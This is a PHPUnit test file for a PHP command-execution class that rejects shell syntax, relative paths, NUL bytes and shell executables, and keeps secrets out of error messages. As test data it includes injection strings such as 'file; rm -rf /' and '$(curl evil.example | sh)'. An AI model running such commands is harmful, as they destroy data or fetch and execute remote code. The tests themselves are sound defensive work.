<?php

declare(strict_types=1);

namespace App\Tests\Unit\System\Command;

use App\Engine\Security\Secret;
use App\Engine\System\Command\Command;
use App\Engine\System\Command\CommandException;
use App\Tests\Support\TestCase;
use PHPUnit\Framework\Attributes\DataProvider;

final class CommandTest extends TestCase
{
    // ---- the executable ------------------------------------------------------

    public function test_a_bare_name_and_its_arguments_are_kept_apart(): void
    {
        $command = new Command('systemctl', ['restart', 'nginx']);

        self::assertSame('systemctl', $command->executable());
        self::assertSame(['restart', 'nginx'], $command->arguments());
    }

    /** @return iterable<string, array{string}> */
    public static function usableExecutables(): iterable
    {
        yield 'bare name' => ['rsync'];
        yield 'name with dot, dash, plus, underscore' => ['php8.3-fpm_x+'];
        yield 'absolute unix path' => ['/usr/bin/rsync'];
        yield 'absolute windows path with a space' => ['C:\\Program Files\\Git\\bin\\git.exe'];
        yield 'windows path with forward slashes' => ['C:/xampp/php/php.exe'];
    }

    #[DataProvider('usableExecutables')]
    public function test_a_name_on_path_or_an_absolute_path_is_accepted(string $executable): void
    {
        self::assertSame($executable, (new Command($executable))->executable());
    }

    public function test_an_empty_executable_is_refused(): void
    {
        $this->expectException(CommandException::class);
        $this->expectExceptionMessage('A command needs an executable');

        new Command('');
    }

    /** The mistake the whole model is shaped against: a command line in one string. */
    public function test_a_command_line_as_the_executable_is_refused_without_repeating_it(): void
    {
        try {
            new Command('mysql -u root -pS3cret');
            self::fail('no exception');
        } catch (CommandException $e) {
            self::assertStringContainsString('The executable "mysql…" contains whitespace', $e->getMessage());
            self::assertStringNotContainsString('S3cret', $e->getMessage());
            self::assertStringNotContainsString('root', $e->getMessage());
        }
    }

    /** @return iterable<string, array{string}> */
    public static function shellExpressions(): iterable
    {
        yield 'command separator' => ['ls;rm'];
        yield 'pipe' => ['cat|sh'];
        yield 'background' => ['sleep&'];
        yield 'substitution' => ['$(id)'];
        yield 'backtick' => ['`id`'];
        yield 'variable' => ['$SHELL'];
        yield 'quoted' => ['"rsync"'];
        yield 'redirect' => ['ls>out'];
        yield 'glob' => ['r*'];
        yield 'leading dash, an option not a program' => ['-rf'];
    }

    #[DataProvider('shellExpressions')]
    public function test_shell_syntax_is_not_a_program_name(string $executable): void
    {
        try {
            new Command($executable);
            self::fail('no exception');
        } catch (CommandException $e) {
            self::assertStringContainsString('The executable is not a program name', $e->getMessage());
            self::assertStringNotContainsString($executable, $e->getMessage());
        }
    }

    /** @return iterable<string, array{string}> */
    public static function relativePaths(): iterable
    {
        yield 'dot slash' => ['./laika'];
        yield 'nested' => ['vendor/bin/phpunit'];
        yield 'parent' => ['../tool'];
        yield 'windows relative' => ['bin\\tool.exe'];
    }

    #[DataProvider('relativePaths')]
    public function test_a_relative_path_is_refused(string $executable): void
    {
        $this->expectException(CommandException::class);
        $this->expectExceptionMessage('The executable is a relative path');

        new Command($executable);
    }

    public function test_a_nul_byte_in_the_executable_is_refused(): void
    {
        $this->expectException(CommandException::class);
        $this->expectExceptionMessage('The executable contains a NUL byte');

        new Command("/usr/bin/rsync\0--delete");
    }

    // ---- arguments -----------------------------------------------------------

    public function test_there_need_be_no_arguments(): void
    {
        self::assertSame([], (new Command('uptime'))->arguments());
    }

    /**
     * An argument is data. Everything a shell would interpret reaches the
     * process as the same bytes, because nothing between here and the process
     * interprets anything.
     *
     * @return iterable<string, array{string}>
     */
    public static function literalArguments(): iterable
    {
        yield 'spaces' => ['/var/backups/March 2026/db.sql'];
        yield 'empty string' => [''];
        yield 'only spaces' => ['   '];
        yield 'separator and second command' => ['file; rm -rf /'];
        yield 'substitution' => ['$(curl evil.example | sh)'];
        yield 'backticks' => ['`id`'];
        yield 'variable' => ['$HOME'];
        yield 'quotes' => ['it\'s "quoted"'];
        yield 'glob' => ['*.log'];
        yield 'newline' => ["first\nsecond"];
        yield 'leading dash' => ['--delete'];
        yield 'unicode' => ['ঢাকা-শহর.txt'];
        yield 'windows metacharacters' => ['a & b ^ c % d'];
    }

    #[DataProvider('literalArguments')]
    public function test_an_argument_is_kept_byte_for_byte(string $argument): void
    {
        self::assertSame(['--', $argument], (new Command('rsync', ['--', $argument]))->arguments());
    }

    public function test_empty_arguments_keep_their_positions(): void
    {
        self::assertSame(['', 'x', ''], (new Command('printf', ['', 'x', '']))->arguments());
    }

    public function test_arguments_with_keys_are_refused(): void
    {
        $this->expectException(CommandException::class);
        $this->expectExceptionMessage('arguments are a list');

        // @phpstan-ignore argument.type (the point of the test is the wrong shape)
        new Command('rsync', ['source' => '/a', 'target' => '/b']);
    }

    public function test_a_non_string_argument_is_refused_by_position(): void
    {
        $this->expectException(CommandException::class);
        $this->expectExceptionMessage('Argument 2 is a int');

        // @phpstan-ignore argument.type (the point of the test is the wrong type)
        new Command('sleep', ['--', 5]);
    }

    public function test_a_nul_byte_in_an_argument_is_refused_without_repeating_it(): void
    {
        try {
            new Command('mysql', ['--password', "S3cret\0tail"]);
            self::fail('no exception');
        } catch (CommandException $e) {
            self::assertStringContainsString('Argument 2 contains a NUL byte', $e->getMessage());
            self::assertStringNotContainsString('S3cret', $e->getMessage());
        }
    }

    public function test_a_secret_argument_stays_wrapped(): void
    {
        $password = new Secret('S3cret');
        $command = new Command('mysql', ['--password', $password]);

        self::assertSame($password, $command->arguments()[1]);
        self::assertStringNotContainsString('S3cret', \print_r($command, true));
    }

    public function test_a_nul_byte_inside_a_secret_argument_is_refused(): void
    {
        $this->expectException(CommandException::class);
        $this->expectExceptionMessage('Argument 1 contains a NUL byte');

        new Command('mysql', [new Secret("a\0b")]);
    }

    // ---- working directory ---------------------------------------------------

    public function test_the_working_directory_is_left_to_the_executor_by_default(): void
    {
        self::assertNull((new Command('ls'))->workingDirectory());
    }

    public function test_an_absolute_working_directory_is_kept(): void
    {
        self::assertSame('/var/www/app', (new Command('ls', workingDirectory: '/var/www/app'))->workingDirectory());
        self::assertSame('C:\\xampp\\htdocs', (new Command('dir', workingDirectory: 'C:\\xampp\\htdocs'))->workingDirectory());
    }

    /** Checking existence here would check a moment other than the one the command runs at. */
    public function test_the_working_directory_is_not_checked_on_disk(): void
    {
        self::assertSame('/does/not/exist', (new Command('ls', workingDirectory: '/does/not/exist'))->workingDirectory());
    }

    public function test_a_relative_working_directory_is_refused(): void
    {
        $this->expectException(CommandException::class);
        $this->expectExceptionMessage('The working directory "storage/backups" is not absolute');

        new Command('ls', workingDirectory: 'storage/backups');
    }

    public function test_an_empty_working_directory_is_refused(): void
    {
        $this->expectException(CommandException::class);
        $this->expectExceptionMessage('The working directory is empty');

        new Command('ls', workingDirectory: '');
    }

    public function test_a_nul_byte_in_the_working_directory_is_refused(): void
    {
        $this->expectException(CommandException::class);
        $this->expectExceptionMessage('The working directory contains a NUL byte');

        new Command('ls', workingDirectory: "/tmp\0/etc");
    }

    // ---- environment ---------------------------------------------------------

    public function test_the_environment_is_left_to_the_executor_by_default(): void
    {
        self::assertNull((new Command('env'))->environment());
    }

    public function test_an_environment_is_kept_as_given_including_an_empty_one(): void
    {
        $key = new Secret('k3y');
        $command = new Command('deploy', environment: ['APP_ENV' => 'production', 'EMPTY' => '', 'API_KEY' => $key]);

        self::assertSame(['APP_ENV' => 'production', 'EMPTY' => '', 'API_KEY' => $key], $command->environment());
        self::assertSame([], (new Command('env', environment: []))->environment());
    }

    /** @return iterable<string, array{array<mixed>, string}> */
    public static function invalidEnvironmentNames(): iterable
    {
        yield 'dash' => [['APP-ENV' => 'x'], 'APP-ENV'];
        yield 'leading digit' => [['1PATH' => 'x'], '1PATH'];
        yield 'numeric key' => [['x'], '0'];
        yield 'empty' => [['' => 'x'], ''];
        yield 'assignment written as the name' => [['MYSQL_PWD=S3cret' => ''], 'MYSQL_PWD'];
    }

    /** @param array<mixed> $environment */
    #[DataProvider('invalidEnvironmentNames')]
    public function test_an_invalid_environment_name_is_refused(array $environment, string $shown): void
    {
        try {
            new Command('env', environment: $environment);
            self::fail('no exception');
        } catch (CommandException $e) {
            self::assertStringContainsString(\sprintf('Environment variable name "%s" is invalid', $shown), $e->getMessage());
            self::assertStringNotContainsString('S3cret', $e->getMessage());
        }
    }

    public function test_a_non_string_environment_value_is_refused_by_name(): void
    {
        $this->expectException(CommandException::class);
        $this->expectExceptionMessage('Environment variable WORKERS is a int');

        // @phpstan-ignore argument.type (the point of the test is the wrong type)
        new Command('env', environment: ['WORKERS' => 4]);
    }

    public function test_a_nul_byte_in_an_environment_value_is_refused_without_repeating_it(): void
    {
        try {
            new Command('env', environment: ['TOKEN' => "S3cret\0"]);
            self::fail('no exception');
        } catch (CommandException $e) {
            self::assertStringContainsString('Environment variable TOKEN contains a NUL byte', $e->getMessage());
            self::assertStringNotContainsString('S3cret', $e->getMessage());
        }
    }

    // ---- timeout, input and output -------------------------------------------

    public function test_the_limits_are_left_to_the_executor_by_default(): void
    {
        $command = new Command('ls');

        self::assertNull($command->timeout());
        self::assertNull($command->maxOutput());
        self::assertNull($command->stdin());
    }

    public function test_a_timeout_input_and_output_limit_are_kept(): void
    {
        $command = new Command('gzip', ['-c'], timeout: 0.5, stdin: "binary\0data", maxOutput: 1);

        self::assertSame(0.5, $command->timeout());
        self::assertSame("binary\0data", $command->stdin());
        self::assertSame(1, $command->maxOutput());
    }

    /** @return iterable<string, array{float}> */
    public static function invalidTimeouts(): iterable
    {
        yield 'zero, which would mean never' => [0.0];
        yield 'negative' => [-1.0];
        yield 'infinite' => [\INF];
        yield 'not a number' => [\NAN];
    }

    #[DataProvider('invalidTimeouts')]
    public function test_there_is_no_way_to_run_without_a_timeout(float $timeout): void
    {
        $this->expectException(CommandException::class);
        $this->expectExceptionMessage('is not a timeout');

        new Command('sleep', ['1'], timeout: $timeout);
    }

    /** @return iterable<string, array{int}> */
    public static function invalidOutputLimits(): iterable
    {
        yield 'zero' => [0];
        yield 'negative, which might read as unlimited' => [-1];
    }

    #[DataProvider('invalidOutputLimits')]
    public function test_there_is_no_way_to_keep_unlimited_output(int $bytes): void
    {
        $this->expectException(CommandException::class);
        $this->expectExceptionMessage('is not a limit');

        new Command('cat', maxOutput: $bytes);
    }

    // ---- shell mode ------------------------------------------------------------

    /**
     * Shell mode is explicit by being absent here. A flag on this class would
     * turn every Command into something one boolean away from `sh -c`, and the
     * value that flips it could come from anywhere; a separate type is chosen in
     * the source, where a reviewer sees it.
     */
    public function test_a_command_has_no_shell_mode_to_switch_on(): void
    {
        $class = new \ReflectionClass(Command::class);

        foreach ($class->getConstructor()?->getParameters() ?? [] as $parameter) {
            self::assertStringNotContainsStringIgnoringCase('shell', $parameter->getName());
        }

        foreach ($class->getMethods(\ReflectionMethod::IS_PUBLIC) as $method) {
            self::assertStringNotContainsStringIgnoringCase('shell', $method->getName());
            self::assertNotSame('__toString', $method->getName(), 'a command must not become a command line');
        }
    }

    /** @return iterable<string, array{string}> */
    public static function shells(): iterable
    {
        yield 'sh' => ['sh'];
        yield 'bash by path' => ['/bin/bash'];
        yield 'busybox' => ['/usr/bin/busybox'];
        yield 'zsh' => ['zsh'];
        yield 'cmd.exe by path' => ['C:\\Windows\\System32\\cmd.exe'];
        yield 'CMD in capitals' => ['CMD'];
        yield 'powershell' => ['powershell.exe'];
        yield 'pwsh' => ['/usr/bin/pwsh'];
    }

    /** `new Command('sh', ['-c', $line])` would be the shell back by the side door. */
    #[DataProvider('shells')]
    public function test_a_shell_is_refused_as_the_executable(string $executable): void
    {
        $this->expectException(CommandException::class);
        $this->expectExceptionMessage('The executable is a shell');

        new Command($executable, ['-c', 'echo hi']);
    }

    /** @return iterable<string, array{string}> */
    public static function notShells(): iterable
    {
        yield 'a name that starts like one' => ['shred'];
        yield 'a path through a directory named bash' => ['/opt/bash/bin/tool'];
        yield 'ssh' => ['ssh'];
    }

    #[DataProvider('notShells')]
    public function test_a_program_is_not_mistaken_for_a_shell(string $executable): void
    {
        self::assertSame($executable, (new Command($executable))->executable());
    }

    public function test_a_command_cannot_be_changed_after_construction(): void
    {
        foreach ((new \ReflectionClass(Command::class))->getProperties() as $property) {
            self::assertTrue($property->isReadOnly(), $property->getName() . ' is writable');
        }
    }
}
